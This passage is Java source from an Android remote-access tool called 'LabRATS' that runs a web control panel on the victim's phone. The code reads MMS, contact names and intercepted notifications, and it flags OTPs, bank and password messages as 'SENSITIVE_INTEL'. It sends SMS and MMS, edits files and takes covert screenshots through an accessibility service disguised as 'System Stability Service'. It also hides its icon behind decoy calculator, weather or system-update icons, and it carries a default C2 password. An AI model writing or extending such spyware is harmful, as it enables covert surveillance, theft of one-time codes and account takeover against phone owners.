        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"display: flex; align-items: center; gap: 10px; justify-content: center;\">");
        html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media (Max 1MB):</span>");
        html.append("<input type=\"file\" name=\"media\" accept=\"image/*,video/*,audio/*\" style=\"color: #888; font-size: 0.8rem;\">");
        html.append("</div>");
        html.append("<button type=\"submit\" style=\"align-self: center;\">UPLOAD & DISPATCH</button>");
        html.append("</div></form></div>");

        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
            return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
        }
        int page = 1; int limit = 20;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception ignored) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Set<String> mmsWithMedia = getMmsIdsWithMedia();
            Uri mmsUri = Uri.parse("content://mms/");
            cursor = context.getContentResolver().query(mmsUri, new String[]{"_id", "date", "msg_box"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                List<String[]> mmsList = new ArrayList<>();
                while (cursor.moveToNext()) {
                    String mmsId = cursor.getString(0);
                    if (mmsWithMedia.contains(mmsId)) {
                        mmsList.add(new String[]{
                            mmsId, 
                            String.valueOf(cursor.getLong(1) * 1000), 
                            String.valueOf(cursor.getInt(2))
                        });
                    }
                }

                int totalCount = mmsList.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" Media Messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Contact</th><th>Content</th><th>Date</th></tr></thead><tbody>");
                
                Map<String, String> contactCache = new HashMap<>();
                for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                    String[] mData = mmsList.get(i);
                    String mmsId = mData[0]; long date = Long.parseLong(mData[1]);
                    int msgBox = Integer.parseInt(mData[2]);
                    String typeLabel = (msgBox == 1) ? "INBOX" : "SENT", typeClass = (msgBox == 1) ? "call-incoming" : "call-outgoing";
                    String address = getMmsAddress(mmsId); List<String> parts = getMmsParts(mmsId);
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td><td style=\"max-width: 400px;\">");
                    for (String part : parts) {
                        if (part.startsWith("text:")) html.append("<div style=\"margin-bottom:5px;\">").append(escapeHtml(part.substring(5))).append("</div>");
                        else if (part.startsWith("image:")) {
                            html.append("<img src=\"/mms/media/").append(part.substring(6))
                                .append("\" style=\"max-width: 150px; border: 1px solid var(--neon-cyan); margin-top:5px; border-radius:4px; cursor:zoom-in;\" onclick=\"window.open(this.src)\">");
                        } else if (part.startsWith("video:")) {
                            html.append("<div style=\"margin-top:10px;\"><video controls style=\"max-width: 250px; border: 1px solid var(--neon-green); border-radius:4px;\">")
                                .append("<source src=\"/mms/media/").append(part.substring(6)).append("\" type=\"video/mp4\">")
                                .append("Your browser does not support the video tag.")
                                .append("</video></div>");
                        }
                    }
                    html.append("</td><td>").append(formatMessageDate(date)).append("</td></tr>");
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/mms?page=1\">First</a>");
                        html.append("<a href=\"/mms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    for (int i = Math.max(1, page-2); i <= Math.min(totalPages, page+2); i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/mms?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/mms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/mms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/mms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div><p>No MMS found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private String getMmsAddress(String mmsId) {
        Uri addrUri = Uri.parse("content://mms/" + mmsId + "/addr");
        String address = "Unknown";
        try (Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null)) {
            if (c != null) {
                int addrIdx = c.getColumnIndex("address");
                while (c.moveToNext()) {
                    if (addrIdx != -1) {
                        String addr = c.getString(addrIdx);
                        if (addr != null && !addr.equals("insert-address-token")) {
                            address = addr;
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS address", e);
        }
        return address;
    }

    private List<String> getMmsParts(String mmsId) {
        List<String> parts = new ArrayList<>();
        Uri partUri = Uri.parse("content://mms/part");
        try (Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null)) {
            if (c != null) {
                int idIdx = c.getColumnIndex("_id");
                int ctIdx = c.getColumnIndex("ct");
                int textIdx = c.getColumnIndex("text");
                while (c.moveToNext()) {
                    if (idIdx == -1 || ctIdx == -1) continue;
                    String partId = c.getString(idIdx);
                    String type = c.getString(ctIdx);
                    if ("text/plain".equals(type)) {
                        String body = textIdx != -1 ? c.getString(textIdx) : null;
                        if (body == null && partId != null) body = getMmsText(partId);
                        if (body != null) parts.add("text:" + body);
                    } else if (type != null && type.startsWith("image/") && partId != null) {
                        parts.add("image:" + partId);
                    } else if (type != null && type.startsWith("video/") && partId != null) {
                        parts.add("video:" + partId);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS parts", e);
        }
        return parts;
    }

    private Set<String> getMmsIdsWithMedia() {
        Set<String> ids = new HashSet<>();
        Uri partUri = Uri.parse("content://mms/part");
        try (Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%' OR ct LIKE 'video/%'", null, null)) {
            if (c != null) {
                int midIdx = c.getColumnIndex("mid");
                while (c.moveToNext()) {
                    if (midIdx != -1) {
                        String mid = c.getString(midIdx);
                        if (mid != null) ids.add(mid);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("LabRATS", "Error getting MMS IDs with media", e);
        }
        return ids;
    }

    private String getContactName(String number, Map<String, String> cache) {
        if (number == null || number.isEmpty() || number.equals("Unknown") || number.equals("insert-address-token")) {
            return number == null ? "Unknown" : number;
        }

        if (cache != null && cache.containsKey(number)) {
            return cache.get(number);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return number;
            }
        }

        String result = number;
        Cursor cursor = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
            cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                if (name != null && !name.isEmpty()) {
                    result = name;
                }
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }

        if (cache != null) {
            cache.put(number, result);
        }
        return result;
    }

    private String formatMessageDate(long timestamp) {
        return new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(timestamp));
    }

    private String getMmsText(String partId) {
        Uri partUri = Uri.parse("content://mms/part/" + partId);
        StringBuilder sb = new StringBuilder();
        try {
            InputStream is = context.getContentResolver().openInputStream(partUri);
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                is.close();
            }
        } catch (Exception e) {}
        return sb.toString();
    }

    private Response serveMmsMedia(String partId) {
        try {
            Uri uri = Uri.parse("content://mms/part/" + partId);
            String mimeType = "application/octet-stream";
            try (Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null)) {
                if (c != null && c.moveToFirst()) {
                    mimeType = c.getString(0);
                }
            } catch (Exception ignored) {}

            InputStream is = context.getContentResolver().openInputStream(uri);
            if (is == null) return serve404();

            // Calculate size correctly for large media/videos
            long size = -1;
            try {
                android.content.res.AssetFileDescriptor afd = context.getContentResolver().openAssetFileDescriptor(uri, "r");
                if (afd != null) {
                    size = afd.getLength();
                    afd.close();
                }
            } catch (Exception ignored) {}

            // Fallback for size if AFD fails
            if (size <= 0) size = is.available();

            Response res = newFixedLengthResponse(Response.Status.OK, mimeType, is, size);
            res.addHeader("Accept-Ranges", "bytes"); // Helpful for video seeking
            return res;
        } catch (Exception e) { return serveError("Failed to load media: " + e.getMessage()); }
    }

    private Response sendSms(Map<String, String> params) {
        String number = params.get("number"), message = params.get("message");
        if (number == null || number.isEmpty() || message == null || message.isEmpty()) return serveError("Invalid number or message");
        try {
            logActivity("COMMS_DISPATCH: SMS sent to " + number);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return serveError("SEND_SMS permission not granted");
            }
            // --- API VIRTUALIZATION: Ghost SMS Dispatch ---
            String className = "android.telephony.SmsManager";
            Object smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                smsManager = context.getSystemService(SmsManager.class);
            } else {
                smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);
            }

            if (smsManager != null) {
                SystemAnalytics.safeCall(className, "sendTextMessage", 
                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
                    smsManager, number, null, message, null, null);
            }

            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
    }

    private Response sendMms(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();

            String number = params.get("number");
            logActivity("COMMS_DISPATCH: MMS package sent to " + (number != null ? number : "unknown"));
            String message = params.get("message");
            String tempFilePath = files.get("media");

            if (number == null || number.isEmpty()) return serveError("Target number is required");
            if (tempFilePath == null) return serveError("Media attachment is required for MMS");

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
                    return serveError("SEND_SMS permission not granted");
            }

            File fileToUpload = new File(tempFilePath);
            if (fileToUpload.length() > 1024 * 1024) {
                return serveError("Media package too large. Carrier limit is typically 1MB.");
            }

            boolean success = MmsSender.send(context, number, message, fileToUpload);

            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\">";
            if (success) {
                html += "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p>";
            } else {
                html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><p>Could not dispatch media package. Check device logs.</p>";
            }
            html += "<a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);

        } catch (Exception e) {
            return serveError("MMS Dispatch Error: " + e.getMessage());
        }
    }

    private Response serveIntel(Map<String, String> params) {
        logActivity("INTEL_UPLINK: Notification stream accessed");
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\" style=\"margin-bottom: 15px;\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");

        // Action Row for Apps (Injected from Terminal)
        html.append("<div class=\"action-row-limited\" style=\"margin-bottom: 20px;\">");
        html.append("<button onclick=\"location.href='/device/apps'\" class=\"btn btn-small btn-fit\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05);\">&#128230; VIEW_INSTALLED_APPS</button>");
        html.append("</div>");
        
        // Reorganized Header
        html.append("<div class=\"card\">");
        html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;\">");
        html.append("<h2 style=\"margin:0;\">&#9889; INTEL_STREAM</h2>");
        html.append("<span style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; text-align:right;\">LISTENER_ACTIVE</span>");
        html.append("</div>");
        
        html.append("<div style=\"display:flex; gap:10px; margin-bottom:20px; max-width: 450px; margin-left:auto; margin-right:auto;\">");
        html.append("<button onclick=\"clearIntel()\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--danger); color:var(--danger); background:rgba(255, 49, 49, 0.05); margin: 0;\">CLEAR_STREAM</button>");
        html.append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"flex:1; border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0, 242, 255, 0.05); margin: 0;\">RELOAD_STREAM</button>");
        html.append("</div>");
        
        html.append("<script>function clearIntel() { if(confirm('Purge all intercepted intel?')) fetch('/intel/clear').then(() => location.reload()); }</script>");

        List<StatusNotification.NotificationData> notifications = StatusNotification.getHistory();

        if (notifications.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128225;</div><p>No active intel stream. Waiting for device notifications...</p></div>");
        } else {
            // Pagination
            int page = 1;
            int limit = 20;
            try {
                if (params.containsKey("page")) {
                    page = Integer.parseInt(params.get("page"));
                    if (page < 1) page = 1;
                }
            } catch (Exception e) { page = 1; }
            
            int totalCount = notifications.size();
            int totalPages = (int) Math.ceil((double) totalCount / limit);
            int offset = (page - 1) * limit;

            html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                    .append(" reports | Page ").append(page).append(" of ").append(totalPages).append("</p>");

            html.append("<table id=\"intel-table\">")
                .append("<thead><tr><th>Source</th><th>Payload</th><th>Uplink_Time</th></tr></thead>")
                .append("<tbody>");

            for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                StatusNotification.NotificationData n = notifications.get(i);
                String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
                
                // --- SENSITIVE DATA HIGHLIGHTING ---
                String payload = (n.title + " " + n.text).toLowerCase();
                
                // Exclude common system noise like "USB for file transfer"
                boolean isSystemNoise = payload.contains("usb") || payload.contains("charging");
                
                boolean isSensitive = !isSystemNoise && (
                                    payload.contains("otp") || 
                                    payload.contains("code") || 
                                    payload.contains("verification") || 
                                    payload.contains("bank") || 
                                    payload.contains("login") || 
                                    payload.contains("password") ||
                                    (payload.contains("transfer") && !payload.contains("file")) || 
                                    payload.contains("confirm"));
                
                String rowStyle = isSensitive ? "style=\"border-left: 3px solid var(--danger); background: rgba(255, 49, 49, 0.05);\"" : "";
                String alertBadge = isSensitive ? "<span style=\"color:var(--danger); font-size:0.6rem; display:block; margin-bottom:5px; font-weight:bold; letter-spacing:1px;\">&#9888; SENSITIVE_INTEL_DETECTED</span>" : "";

                html.append("<tr ").append(rowStyle).append(">")
                    .append("<td style=\"color:var(--neon-green); font-weight:bold;\">").append(escapeHtml(n.packageName)).append("</td>")
                    .append("<td>")
                    .append(alertBadge)
                    .append("<div style=\"color:#fff; font-weight:bold; margin-bottom:4px;\">").append(escapeHtml(n.title)).append("</div>")
                    .append("<div style=\"font-size:0.8rem; opacity:0.8;\">").append(escapeHtml(n.text)).append("</div>")
                    .append("</td>")
                    .append("<td style=\"font-family:monospace; opacity:0.6;\">").append(time).append("</td>")
                    .append("</tr>");
            }
            html.append("</tbody></table>");
            
            // Pagination UI
            if (totalPages > 1) {
                html.append("<div class=\"pagination\" style=\"margin-top: 25px; flex-direction: column; gap: 12px;\">");
                
                html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");
                if (page > 1) {
                    html.append("<a href=\"/intel?page=1\">FIRST</a>");
                    html.append("<a href=\"/intel?page=").append(page - 1).append("\">&laquo; PREV</a>");
                }
                
                int startPage = Math.max(1, page - 1);
                int endPage = Math.min(totalPages, page + 1);
                for (int i = startPage; i <= endPage; i++) {
                    String active = (i == page) ? "class=\"active\"" : "";
                    html.append("<a ").append(active).append(" href=\"/intel?page=").append(i).append("\">").append(i).append("</a>");
                }

                if (page < totalPages) {
                    html.append("<a href=\"/intel?page=").append(page + 1).append("\">NEXT &raquo;</a>");
                    html.append("<a href=\"/intel?page=").append(totalPages).append("\">LAST</a>");
                }
                html.append("</div>");

                // Jump to page form
                html.append("<form action=\"/intel\" method=\"GET\" style=\"display: inline-flex; align-items: center; gap: 8px; margin-top: 5px;\">")
                    .append("<span style=\"font-size: 0.7rem; color: #888;\">JUMP:</span>")
                    .append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 55px; height: 32px; background: #000; border: 1px solid rgba(0, 242, 255, 0.2); color: #fff; border-radius: 8px; text-align: center; font-size: 0.8rem;\">")
                    .append("<button type=\"submit\" class=\"btn btn-small\" style=\"padding: 5px 10px; margin: 0;\">GO</button>")
                    .append("</form>");

                html.append("</div>");
            }
        }
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFileEdit(String path) {
        path = path.replace("%20", " ");
        logActivity("DATA_ACCESS: File editor opened - " + path);
        File file = new File(Environment.getExternalStorageDirectory(), path);
        if (!file.exists() || !file.isFile()) return serve404();

        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        } catch (Exception e) {
            return serveError("Failed to read file: " + e.getMessage());
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\"><a href=\"/files/").append(file.getParentFile().getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), ""))
            .append("\" class=\"btn-back\">&#8592; Back to Directory</a></div>");
        
        html.append("<h2><span style=\"color:var(--neon-orange);\">&#9998;</span> EDIT_CORE_DATA: ").append(file.getName()).append("</h2>");
        html.append("<div class=\"card\" style=\"padding:20px;\">");
        html.append("<form action=\"/files/save\" method=\"POST\">")
            .append("<input type=\"hidden\" name=\"path\" value=\"").append(escapeHtml(path)).append("\">")
            .append("<textarea name=\"content\" style=\"width:100%; height:500px; background:#000; color:var(--terminal-green); border:1px solid rgba(0,242,255,0.2); border-radius:12px; padding:15px; font-family:'JetBrains Mono',monospace; font-size:0.9rem; resize:vertical; outline:none;\" spellcheck=\"false\">")
            .append(escapeHtml(content.toString()))
            .append("</textarea>")
            .append("<div style=\"margin-top:20px; display:flex; justify-content:flex-end; gap:15px;\">")
            .append("<button type=\"submit\" class=\"btn\">DEPLOY_CHANGES</button>")
            .append("</div>")
            .append("</form>");
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response saveFile(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            
            String path = params.get("path");
            String content = params.get("content");
            
            if (path == null) return serveError("Path is missing");
            File file = new File(Environment.getExternalStorageDirectory(), path);
            
            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(file)) {
                fos.write(content.getBytes());
                logActivity("DATA_MODIFIED: File saved - " + path);
            }
            
            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Data Synchronized</h2><p>Changes deployed successfully to storage.</p><a href=\"/files/edit/" + escapeHtml(path) + "\" class=\"btn\">Back to Editor</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Save Failed: " + e.getMessage());
        }
    }

    private Response toggleNightMode() {
        boolean current = MediaContainer.isNightModeEnabled(context);
        boolean newValue = !current;
        
        // Save to prefs directly from here
        context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                .edit().putBoolean("night_mode", newValue).apply();
        
        logActivity("OPTICS_PROTOCOL: Night Vision " + (newValue ? "ENABLED" : "DISABLED"));
        
        MediaContainer service = MediaContainer.getInstance();
        if (service != null) {
            service.setNightMode(newValue);
        }
        
        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + newValue + "}");
    }

    private Response toggleStealthMode(Map<String, String> params) {
        try {
            String type = params.get("type");
            if (type == null) type = "update";

            android.content.pm.PackageManager pm = context.getPackageManager();
            android.content.ComponentName mainAlias = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
            
            // Library of component aliases
            android.content.ComponentName updateAlias = new android.content.ComponentName(context, "com.labs.labrats.SystemUpdateAlias");
            android.content.ComponentName calcAlias = new android.content.ComponentName(context, "com.labs.labrats.CalculatorAlias");
            android.content.ComponentName weatherAlias = new android.content.ComponentName(context, "com.labs.labrats.WeatherAlias");
            android.content.ComponentName settingsAlias = new android.content.ComponentName(context, "com.labs.labrats.SettingsAlias");
            
            android.content.ComponentName targetAlias;
            switch(type) {
                case "calc": targetAlias = calcAlias; break;
                case "weather": targetAlias = weatherAlias; break;
                case "settings": targetAlias = settingsAlias; break;
                default: targetAlias = updateAlias; break;
            }
            
            int mainState = pm.getComponentEnabledSetting(mainAlias);
            boolean forceRestore = "restore".equals(params.get("action"));
            
            if (!forceRestore && mainState != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                // Switch to Fake Icon from Library
                logActivity("STEALTH_EXECUTION: Stealth Mode ENABLED (" + type + ")");
                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(targetAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                
                // Trigger notification update
                Intent refreshIntent = new Intent(context, CoreSyncService.class);
                refreshIntent.setAction("START");
                context.startService(refreshIntent);

                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"stealth\", \"type\": \"" + type + "\", \"hidden\": true}");
            } else {
                // Restore Main Icon and disable ALL decoys
                logActivity("STEALTH_EXECUTION: Stealth Mode DISABLED");
                pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);

                // Trigger notification update
                Intent refreshIntent = new Intent(context, CoreSyncService.class);
                refreshIntent.setAction("START");
                context.startService(refreshIntent);

                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"normal\", \"hidden\": false}");
            }
        } catch (Exception e) {
            return serveError("Stealth Error: " + e.getMessage());
        }
    }

    private Response updatePassword(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            String newPass = params.get("new_password");

            if (newPass == null || newPass.trim().isEmpty()) {
                return serveError("Invalid password");
            }

            context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                    .edit()
                    .putString("c2_password", newPass.trim())
                    .apply();

            logActivity("SECURITY_PROTOCOL: Interface password updated");

            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><p>New security protocol active. You will need to use this key for future uplinks.</p><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Failed to update password: " + e.getMessage());
        }
    }

    private String getStoredPassword() {
        return context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                .getString("c2_password", "admin1337");
    }

    private Response serveCovertScreenshot() {
        AccessibilityCore ghost = AccessibilityCore.getInstance();
        if (ghost == null) return serveError("Ghost Service Offline");

        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        final byte[][] result = new byte[1][];
        final String[] error = new String[1];

        ghost.takeCovertScreenshot(new AccessibilityCore.ScreenshotCallback() {
            @Override
            public void onSuccess(byte[] jpegData) {
                result[0] = jpegData;
                latch.countDown();
            }

            @Override
            public void onFailure(String err) {
                error[0] = err;
                latch.countDown();
            }
        });

        try {
            if (latch.await(3, java.util.concurrent.TimeUnit.SECONDS)) { // Reduced timeout for speed
                if (result[0] != null) {
                    return newFixedLengthResponse(Response.Status.OK, "image/jpeg", new java.io.ByteArrayInputStream(result[0]), result[0].length);
                } else {
                    return serveError("Screenshot Failed: " + error[0]);
                }
            } else {
                return serveError("Screenshot Timeout");
            }
        } catch (Exception e) {
            return serveError("Internal Error: " + e.getMessage());
        }
    }

    private Response serveGhostPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px;\">")
            .append("<span style=\"color:var(--neon-cyan);\">&#128123;</span> GHOST_CONTROLLER")
            .append("</h2>");

        boolean isActive = AccessibilityCore.getInstance() != null;
        html.append("<div id=\"ghost-status-card\" class=\"status-card\" style=\"padding:20px; background:rgba(255,255,255,0.05); border-radius:12px; margin-bottom:25px; border:1px solid ").append(isActive ? "var(--neon-green)" : "var(--danger)").append(";\">");
        html.append("<div class=\"info-label\">GHOST_MODE_STATUS</div>");
        html.append("<div id=\"ghost-status-text\" style=\"font-size:1.1rem; font-weight:bold;\">")
            .append(isActive ? "<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>" : "<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>")
            .append("</div>");
        
        html.append("<div id=\"accessibility-prompt\" style=\"display: ").append(isActive ? "none" : "block").append("; text-align: left;\">");
        html.append("<p style=\"color:#888; font-size:0.8rem; margin-top:10px;\">Ghost Mode requires <b>Accessibility Permission</b>. Instruct the user to enable 'System Stability Service' in Accessibility settings.</p>");
        html.append("<button onclick=\"openSettings()\" class=\"btn btn-small\" style=\"margin-top:15px; border-radius:12px; padding: 10px 25px;\">OPEN_SETTINGS</button>");
        html.append("</div>");
        html.append("</div>");

        // --- GHOST_UTILITIES_SECTION ---
        html.append("<div class=\"card\" style=\"border-left: 5px solid var(--neon-green);\">");
        html.append("<h2 style=\"color: var(--neon-green); margin-bottom: 15px; font-size: 0.95rem;\">GHOST_UTILITIES</h2>");
        html.append("<div class=\"info-grid\">");
        
        // Blackout Protocol
        html.append("<div class=\"info-item\">");
        html.append("<div class=\"info-label\">BLACKOUT_PROTOCOL</div>");
